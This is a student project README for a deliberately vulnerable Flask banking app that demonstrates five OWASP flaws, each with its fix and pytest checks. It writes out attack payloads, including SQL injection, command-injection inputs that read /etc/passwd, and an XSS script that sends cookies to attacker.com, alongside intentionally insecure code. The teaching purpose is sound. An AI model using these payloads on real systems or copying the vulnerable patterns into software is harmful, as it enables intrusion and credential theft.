# CT-477 Secure Software Design & Development
## Complex Computing Activity — Spring 2026
### NED University of Engineering & Technology

---
## Group Members :
Maryam Khan CR-22021
Ayesha Yousuf CR-22004

## Project Overview

**VulnBank** is a deliberately vulnerable web banking application built in **Flask/Python**.  
It demonstrates **five OWASP Top-10 security vulnerabilities**, their exploits, and their fixes —
with a complete automated test suite proving each fix works.

---

## Project Structure

```
ct477_project/
├── vulnerable/
│   └── app.py          ← Intentionally vulnerable app (port 5000)
├── fixed/
│   └── app.py          ← All vulnerabilities patched (port 5001)
├── tests/
│   └── test_security.py ← Automated tests for all 5 vulnerabilities
├── requirements.txt
└── README.md
```

---

## Vulnerabilities Summary

| # | Vulnerability | CWE | Vulnerable File | Attack |
|---|---|---|---|---|
| 1 | SQL Injection | CWE-89 | vulnerable/app.py `/login` | `' OR '1'='1'--` as username |
| 2 | Stored XSS | CWE-79 | vulnerable/app.py `/comments` | `<script>alert(document.cookie)</script>` |
| 3 | Broken Auth | CWE-916 + CWE-307 | vulnerable/app.py `/register` | Rainbow-table MD5 crack + brute force |
| 4 | Command Injection | CWE-78 | vulnerable/app.py `/ping` | `127.0.0.1; cat /etc/passwd` |
| 5 | IDOR | CWE-639 | vulnerable/app.py `/user/<id>` | Visit `/user/2` without login |

---

## Vulnerability Details

### 1. SQL Injection (CWE-89)

**Root Cause:** User input is formatted directly into the SQL string.

```python
# VULNERABLE
query = f"SELECT * FROM users WHERE username='{u}' AND password='{ph}'"
conn.execute(query)
```

**Attack Payload:**
```
username: ' OR '1'='1'--
password: anything
```

**Resulting SQL:**
```sql
SELECT * FROM users WHERE username='' OR '1'='1'-- AND password='...'
```
`'1'='1'` is always true. `--` comments out the password check. Returns admin row → auth bypassed.

**Fix:**
```python
# FIXED — parameterized query
conn.execute("SELECT * FROM users WHERE username=?", (u,))
```

---

### 2. Cross-Site Scripting — XSS (CWE-79)

**Root Cause:** Jinja2 `|safe` filter disables HTML auto-escaping in the template.

```html
<!-- VULNERABLE -->
<div>{{ c[2]|safe }}</div>
```

**Attack Payload (post as comment):**
```html
<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>
```
Script executes in every visitor's browser → session cookies stolen.

**Fix:**
```html
<!-- FIXED — no |safe, Jinja2 auto-escapes < to &lt; -->
<div>{{ c[2] }}</div>
```
Output: `&lt;script&gt;...` — displayed as text, never executed.

---

### 3. Broken Authentication (CWE-916 + CWE-307)

**Root Cause A — Weak Hashing:**
```python
# VULNERABLE: unsalted MD5
hashlib.md5(password.encode()).hexdigest()
# MD5('password') = 5f4dcc3b5aa765d61d8327deb882cf99
# → crackstation.net → "password" in milliseconds
```

**Root Cause B — No Rate Limiting:** Unlimited login attempts → brute force possible.

**Fix A — PBKDF2-SHA256:**
```python
# FIXED: 260,000 iterations + random 16-byte salt per user
salt = os.urandom(16)
dk = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 260_000)
stored = salt.hex() + ":" + dk.hex()
```

**Fix B — Rate Limiting:**
```python
# Max 5 attempts per IP per 60 seconds → HTTP 429
if is_rate_limited(request.remote_addr):
    return jsonify({"error": "Too many attempts"}), 429
```

---

### 4. Command Injection (CWE-78)

**Root Cause:** `shell=True` with unsanitized user input in `subprocess.run`.

```python
# VULNERABLE
subprocess.run(f"ping -c 2 {host}", shell=True, ...)
```

**Attack Payloads:**
```
127.0.0.1; cat /etc/passwd
127.0.0.1 && id
127.0.0.1 | whoami
```
The shell interprets the `;`, `&&`, `|` and runs arbitrary commands on the server.

**Fix:**
```python
# FIXED: strict allowlist + no shell=True
SAFE_HOST = re.compile(r'^[a-zA-Z0-9.\-]{1,253}$')

if not SAFE_HOST.match(host):
    return error("Invalid host")

subprocess.run(["ping", "-c", "2", host], shell=False, ...)
```

---

### 5. IDOR — Insecure Direct Object Reference (CWE-639)

**Root Cause:** No authentication or ownership check before returning user data.

```python
# VULNERABLE — uid comes from URL, no check
@app.route("/user/<int:uid>")
def user_profile(uid):
    row = conn.execute("SELECT * FROM users WHERE id=?", (uid,)).fetchone()
    return render_template_string(USER_HTML, u=row)   # anyone can call this
```

**Attack:** Visit `/user/1`, `/user/2`, `/user/3` — see names, emails, balances without logging in.

**Fix:**
```python
# FIXED — must be logged in AND own the profile (or be admin)
if "uid" not in session:
    return jsonify({"error": "Login required"}), 401

if session["uid"] != uid and session.get("role") != "admin":
    return jsonify({"error": "Access denied"}), 403
```

---

## Setup

### Requirements
```
Flask>=2.3.0
pytest>=7.4.0
```

### Install
```bash
pip install -r requirements.txt
```

### Run Vulnerable App (port 5000)
```bash
cd vulnerable
python app.py
# → http://localhost:5000
```

### Run Fixed App (port 5001)
```bash
cd fixed
python app.py
# → http://localhost:5001
```

---

## Running Tests

```bash
pytest tests/test_security.py -v
```

### Expected Output (all 22 tests pass):

```
tests/test_security.py::TestSQLInjection::test_sqli_attack_VULNERABLE       PASSED
tests/test_security.py::TestSQLInjection::test_sqli_blocked_FIXED           PASSED
tests/test_security.py::TestSQLInjection::test_legitimate_login_FIXED       PASSED
tests/test_security.py::TestXSS::test_xss_executes_VULNERABLE               PASSED
tests/test_security.py::TestXSS::test_xss_escaped_FIXED                     PASSED
tests/test_security.py::TestXSS::test_normal_comment_FIXED                  PASSED
tests/test_security.py::TestBrokenAuthentication::test_md5_hash_stored_VULNERABLE  PASSED
tests/test_security.py::TestBrokenAuthentication::test_pbkdf2_hash_stored_FIXED    PASSED
tests/test_security.py::TestBrokenAuthentication::test_same_password_different_hashes_FIXED PASSED
tests/test_security.py::TestBrokenAuthentication::test_no_rate_limiting_VULNERABLE PASSED
tests/test_security.py::TestBrokenAuthentication::test_rate_limiting_FIXED  PASSED
tests/test_security.py::TestBrokenAuthentication::test_short_password_rejected_FIXED PASSED
tests/test_security.py::TestCommandInjection::test_cmd_injection_semicolon_VULNERABLE PASSED
tests/test_security.py::TestCommandInjection::test_cmd_injection_and_VULNERABLE     PASSED
tests/test_security.py::TestCommandInjection::test_cmd_injection_blocked_FIXED      PASSED
tests/test_security.py::TestCommandInjection::test_valid_host_FIXED         PASSED
tests/test_security.py::TestIDOR::test_idor_unauth_access_VULNERABLE        PASSED
tests/test_security.py::TestIDOR::test_idor_cross_user_VULNERABLE           PASSED
tests/test_security.py::TestIDOR::test_idor_unauth_blocked_FIXED            PASSED
tests/test_security.py::TestIDOR::test_idor_cross_user_blocked_FIXED        PASSED
tests/test_security.py::TestIDOR::test_own_profile_works_FIXED              PASSED
tests/test_security.py::TestIDOR::test_admin_can_view_any_FIXED             PASSED

22 passed in X.XXs
```

> **Convention:** `_VULNERABLE` tests PASS when the attack succeeds (vulnerability confirmed).
> `_FIXED` tests PASS when the attack is blocked (fix confirmed).

---

## Demo Video Script (4 minutes)

**[0:00–0:20] Introduction**
Show both apps side by side. Explain the goal.

**[0:20–1:00] Attack 1 & 2 — SQLi + XSS**
- On vulnerable app: login with `' OR '1'='1'--` → show admin access
- Post `<script>alert('XSS')</script>` → alert fires
- Switch to fixed app: same inputs → blocked

**[1:00–1:40] Attack 3 — Broken Auth**
- Show DB: MD5 hash `5f4dcc3b5aa765d61d8327deb882cf99`
- Open crackstation.net → instant crack: "password"
- Show fixed DB: PBKDF2 `salt:hash` format — uncrackable
- Rapid-fire 6 login attempts → 429 Too Many Requests

**[1:40–2:20] Attack 4 — Command Injection**
- Ping tool: `127.0.0.1; id` → server response includes uid info
- Fixed app: same payload → "Invalid host" error

**[2:20–3:00] Attack 5 — IDOR**
- Vulnerable: visit `/user/1`, `/user/2`, `/user/3` without login → all data visible
- Fixed: `/user/1` → 401; log in as alice → `/user/3` → 403

**[3:00–4:00] Run Tests**
- `pytest tests/test_security.py -v`
- All 22 tests pass
- Brief conclusion

---

## References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CWE-89 SQL Injection: https://cwe.mitre.org/data/definitions/89.html
- CWE-79 XSS: https://cwe.mitre.org/data/definitions/79.html
- CWE-916 Weak Hashing: https://cwe.mitre.org/data/definitions/916.html
- CWE-78 Command Injection: https://cwe.mitre.org/data/definitions/78.html
- CWE-639 IDOR: https://cwe.mitre.org/data/definitions/639.html
- NIST PBKDF2 guidance: https://csrc.nist.gov/publications/detail/sp/800-132/final

---

*CT-477 Secure Software Design & Development — Spring 2026*  
*Department of Computer Science & IT, NED University of Engineering & Technology*
